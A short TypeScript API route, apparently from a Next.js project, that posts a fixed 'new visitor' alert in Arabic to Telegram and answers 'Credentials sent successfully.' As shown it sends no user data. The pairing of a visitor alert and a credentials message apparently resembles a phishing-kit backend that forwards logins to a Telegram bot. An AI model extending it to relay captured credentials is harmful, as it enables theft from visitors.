import { sendTelegram } from '@/lib/telegram';

export async function POST() {
  try {
    await sendTelegram(
      `زائر جديد 🔐:`
    );
  } catch (err) {
    return Response.json(
      { error: err instanceof Error ? err.message : 'Telegram send failed.' },
      { status: 502 }
    );
  }

  return Response.json({ message: 'Credentials sent successfully.' });
}
